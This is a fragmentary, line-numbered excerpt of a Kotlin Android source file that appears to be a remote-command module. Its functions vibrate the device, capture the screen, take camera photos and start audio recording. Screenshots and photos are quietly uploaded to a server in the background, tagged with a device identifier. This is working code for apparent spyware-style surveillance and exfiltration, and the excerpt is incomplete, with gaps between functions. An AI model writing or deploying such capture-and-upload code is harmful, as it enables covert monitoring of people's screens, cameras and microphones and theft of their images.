   110→   110→    fun vibrate(context: Context, params: Map<String, Any>): String {
   111→   111→        return try {
   112→   112→            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
   113→   113→            if (!vibrator.hasVibrator()) return "Device has no vibrator"
   114→   114→            
   115→   115→            val duration = ((params["arg"]?.toString()?.toLongOrNull() ?: 1000L)).coerceAtMost(5000)
   116→   116→            val pattern = params["pattern"] as? List<Long>
   117→   117→            
   118→   118→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
   119→   119→                val effect = if (pattern != null && pattern.isNotEmpty()) {
   120→   120→                    VibrationEffect.createWaveform(pattern.toLongArray(), -1)
   121→   121→                } else {
   122→   122→                    VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE)
   123→   123→                }
   124→   124→                vibrator.vibrate(effect)
   125→   125→            } else {
   126→   126→                @Suppress("DEPRECATION")
   127→   127→                if (pattern != null && pattern.isNotEmpty()) {
   128→   128→                    vibrator.vibrate(pattern.toLongArray(), -1)
   129→   129→                } else {
   130→   130→                    vibrator.vibrate(duration)
   131→   131→                }
   132→   132→            }
   133→   133→            "Vibrating for ${duration}ms"
   134→   134→        } catch (e: Exception) {
   135→   135→            Log.e(TAG, "Vibrate error", e)
   136→   136→            "Error: ${e.message}"
   137→   137→        }
   138→   138→    }

   161→   161→                try { player?.stop(); player?.release() } catch (_: Exception) {}

   172→   172→        return try {

   182→   182→                        "action" to "request_screen_capture"
   183→   183→                    )
   184→   184→                }
   185→   185→                
   186→   186→                // Use the service to capture
   187→   187→                val screenshotResult = captureScreenReal(context, resultCode, data)
   188→   188→                screenshotResult

   191→   191→            }
   192→   192→        } catch (e: Exception) {
   193→   193→            Log.e(TAG, "Screenshot error", e)

   196→   196→    }

   198→   198→    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
   199→   199→    private fun captureScreenReal(context: Context, resultCode: Int, data: Intent): Map<String, Any> {
   200→   200→        val latch = CountDownLatch(1)
   201→   201→        var resultBitmap: Bitmap? = null
   202→   202→        var error: String? = null
   203→   203→        
   204→   204→        try {
   205→   205→            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
   206→   206→            val projection = mpm.getMediaProjection(resultCode, data)
   207→   207→            
   208→   208→            if (projection == null) {
   209→   209→                return mapOf("error" to "Failed to create media projection")
   210→   210→            }
   211→   211→            
   212→   212→            val metrics = context.resources.displayMetrics
   213→   213→            val width = metrics.widthPixels
   214→   214→            val height = metrics.heightPixels
   215→   215→            val density = metrics.densityDpi
   216→   216→            
   217→   217→            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
   218→   218→            
   219→   219→            val virtualDisplay = projection.createVirtualDisplay(
   220→   220→                "ScreenCapture",
   221→   221→                width, height, density,
   222→   222→                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
   223→   223→                imageReader.surface, null, null
   224→   224→            )
   225→   225→            
   226→   226→            imageReader.setOnImageAvailableListener({ reader ->
   227→   227→                try {
   228→   228→                    val image = reader.acquireLatestImage()
   229→   229→                    if (image != null) {
   230→   230→                        val planes = image.planes
   231→   231→                        val buffer = planes[0].buffer
   232→   232→                        val bytes = ByteArray(buffer.remaining())
   233→   233→                        buffer.get(bytes)
   234→   234→                        
   235→   235→                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
   236→   236→                        if (bitmap != null) {
   237→   237→                            resultBitmap = bitmap
   238→   238→                        }
   239→   239→                        image.close()
   240→   240→                        latch.countDown()
   241→   241→                    }
   242→   242→                } catch (e: Exception) {
   243→   243→                    error = e.message
   244→   244→                    latch.countDown()
   245→   245→                }
   246→   246→            }, Handler(context.mainLooper))
   247→   247→            
   248→   248→            // Wait for capture
   249→   249→            latch.await(5, TimeUnit.SECONDS)
   250→   250→            
   251→   251→            // Cleanup
   252→   252→            virtualDisplay?.release()
   253→   253→            imageReader?.close()
   254→   254→            projection.stop()
   255→   255→            
   256→   256→            if (resultBitmap != null) {
   257→   257→                // Convert to base64
   258→   258→                val stream = ByteArrayOutputStream()
   259→   259→                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
   260→   260→                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
   261→   261→                
   262→   262→                // Save to file
   263→   263→                val file = File(context.cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
   264→   264→                FileOutputStream(file).use { it.write(stream.toByteArray()) }
   265→   265→                
   266→   266→                // Upload to server (file will be cached for streaming viewer)
   267→   267→                CoroutineScope(Dispatchers.IO).launch {
   268→   268→                    try {
   269→   269→                        ApiClient.uploadFile(file, "screenshot")
   270→   270→                    } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
   271→   271→                }
   272→   272→                
   273→   273→                // Return full base64 for streaming viewer (server caches this)
   274→   274→                return mapOf(
   275→   275→                    "status" to "success",
   276→   276→                    "message" to "Screenshot captured",
   277→   277→                    "width" to resultBitmap!!.width,
   278→   278→                    "height" to resultBitmap!!.height,
   279→   279→                    "size" to stream.size(),
   280→   280→                    "file" to file.name,
   281→   281→                    "base64_preview" to base64
   282→   282→                )
   283→   283→            } else {
   284→   284→                return mapOf("error" to (error ?: "Failed to capture screen"))
   285→   285→            }
   286→   286→        } catch (e: Exception) {
   287→   287→            Log.e(TAG, "Screen capture error", e)
   288→   288→            return mapOf("error" to (e.message ?: "Unknown error"))
   289→   289→        }
   290→   290→    }

   301→   301→    private fun takePhotoReal(context: Context, facing: Int): Map<String, Any> {
   302→   302→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
   303→   303→            return mapOf("error" to "Camera2 requires Android 5.0+")
   304→   304→        }
   305→   305→        
   306→   306→        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
   307→   307→            return mapOf(
   308→   308→                "error" to "Camera permission not granted",
   309→   309→                "permission_required" to "android.permission.CAMERA"
   310→   310→            )
   311→   311→        }
   312→   312→        
   313→   313→        val latch = CountDownLatch(1)
   314→   314→        var resultBitmap: Bitmap? = null
   315→   315→        var errorMessage: String? = null
   316→   316→        var reader: ImageReader? = null
   317→   317→        var thread: HandlerThread? = null
   318→   318→        
   319→   319→        try {
   320→   320→            val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
   321→   321→            var cameraId: String? = null
   322→   322→            
   323→   323→            // Find camera with correct facing
   324→   324→            for (id in manager.cameraIdList) {
   325→   325→                val characteristics = manager.getCameraCharacteristics(id)
   326→   326→                val lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
   327→   327→                if (lensFacing == facing) {
   328→   328→                    cameraId = id
   329→   329→                    break
   330→   330→                }
   331→   331→            }
   332→   332→            
   333→   333→            if (cameraId == null) {
   334→   334→                return mapOf("error" to "No ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera found")
   335→   335→            }
   336→   336→            
   337→   337→            // Setup handler thread
   338→   338→            thread = HandlerThread("CameraThread").apply { start() }
   339→   339→            val handler = Handler(thread!!.looper)
   340→   340→            
   341→   341→            // Get optimal size
   342→   342→            val characteristics = manager.getCameraCharacteristics(cameraId)
   343→   343→            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
   344→   344→            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
   345→   345→            val size = sizes?.maxByOrNull { it.width * it.height }
   346→   346→                ?: return mapOf("error" to "No supported JPEG sizes")
   347→   347→            
   348→   348→            // Create image reader
   349→   349→            reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
   350→   350→            
   351→   351→            reader.setOnImageAvailableListener({ imageReader ->
   352→   352→                try {
   353→   353→                    val image = imageReader.acquireLatestImage()
   354→   354→                    if (image != null) {
   355→   355→                        val buffer = image.planes[0].buffer
   356→   356→                        val bytes = ByteArray(buffer.remaining())
   357→   357→                        buffer.get(bytes)
   358→   358→                        
   359→   359→                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
   360→   360→                        resultBitmap = bitmap
   361→   361→                        
   362→   362→                        // Save to file
   363→   363→                        val file = File(context.cacheDir, "camera_${System.currentTimeMillis()}.jpg")
   364→   364→                        FileOutputStream(file).use { it.write(bytes) }
   365→   365→                        
   366→   366→                        // Upload in background (with device_id for server identification)
   367→   367→                        CoroutineScope(Dispatchers.IO).launch {
   368→   368→                            try { ApiClient.uploadFile(file, "camera") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
   369→   369→                        }
   370→   370→                        
   371→   371→                        image.close()
   372→   372→                    }
   373→   373→                } catch (e: Exception) {
   374→   374→                    errorMessage = e.message
   375→   375→                }
   376→   376→                latch.countDown()
   377→   377→            }, handler)
   378→   378→            
   379→   379→            // Open camera
   380→   380→            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
   381→   381→                override fun onOpened(camera: CameraDevice) {
   382→   382→                    try {
   383→   383→                        val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
   384→   384→                        captureRequest.addTarget(reader.surface)
   385→   385→                        captureRequest.set(CaptureRequest.JPEG_ORIENTATION, 90)
   386→   386→                        
   387→   387→                        camera.createCaptureSession(
   388→   388→                            listOf(reader.surface),
   389→   389→                            object : CameraCaptureSession.StateCallback() {
   390→   390→                                override fun onConfigured(session: CameraCaptureSession) {
   391→   391→                                    session.capture(captureRequest.build(), null, handler)
   392→   392→                                    
   393→   393→                                    // Close after capture
   394→   394→                                    handler.postDelayed({
   395→   395→                                        camera.close()
   396→   396→                                        reader?.close()
   397→   397→                                        thread?.quitSafely()
   398→   398→                                    }, 2000)
   399→   399→                                }
   400→   400→                                
   401→   401→                                override fun onConfigureFailed(session: CameraCaptureSession) {
   402→   402→                                    errorMessage = "Session configuration failed"
   403→   403→                                    latch.countDown()
   404→   404→                                }
   405→   405→                            },
   406→   406→                            handler
   407→   407→                        )
   408→   408→                    } catch (e: Exception) {
   409→   409→                        errorMessage = e.message
   410→   410→                        latch.countDown()
   411→   411→                    }
   412→   412→                }
   413→   413→                
   414→   414→                override fun onDisconnected(camera: CameraDevice) {
   415→   415→                    camera.close()
   416→   416→                }
   417→   417→                
   418→   418→                override fun onError(camera: CameraDevice, error: Int) {
   419→   419→                    errorMessage = "Camera error: $error"
   420→   420→                    camera.close()
   421→   421→                    latch.countDown()
   422→   422→                }
   423→   423→            }, handler)
   424→   424→            
   425→   425→            // Wait for result with cleanup on timeout
   426→   426→            val success = latch.await(10, TimeUnit.SECONDS)
   427→   427→
   428→   428→            if (resultBitmap != null) {
   429→   429→                val stream = ByteArrayOutputStream()
   430→   430→                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
   431→   431→                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
   432→   432→                
   433→   433→                return mapOf(
   434→   434→                    "status" to "success",
   435→   435→                    "message" to "Photo captured from ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera",
   436→   436→                    "width" to resultBitmap!!.width,
   437→   437→                    "height" to resultBitmap!!.height,
   438→   438→                    "size" to stream.size(),
   439→   439→                    "base64_preview" to base64
   440→   440→                )
   441→   441→            } else {
   442→   442→                return mapOf("error" to (errorMessage ?: "Failed to capture photo"))
   443→   443→            }
   444→   444→        } catch (e: Exception) {
   445→   445→            Log.e(TAG, "Camera capture error", e)
   446→   446→            return mapOf("error" to (e.message ?: "Camera capture failed"))
   447→   447→        } finally {
   448→   448→            // Ensure resources are cleaned up even on timeout or error
   449→   449→            try { reader?.close() } catch (_: Exception) {}
   450→   450→            try { thread?.quitSafely() } catch (_: Exception) {}
   451→   451→        }
   452→   452→    }

   455→   455→    fun startAudioRecording(context: Context, params: Map<String, Any>): Map<String, Any> {

   464→   464→            if (isRecordingAudio) {
   465→   465→                return mapOf("error" to "Already recording audio")
   466→   466→            }
   467→   467→            
   468→   468→            val duration = (params["duration"] as? Number)?.toInt() ?: 60
   469→   469→            val sampleRate = 44100
   470→   470→            val channelConfig = AudioFormat.CHANNEL_IN_MONO
   471→   471→            val audioFormat = AudioFormat.ENCODING_PCM_16BIT
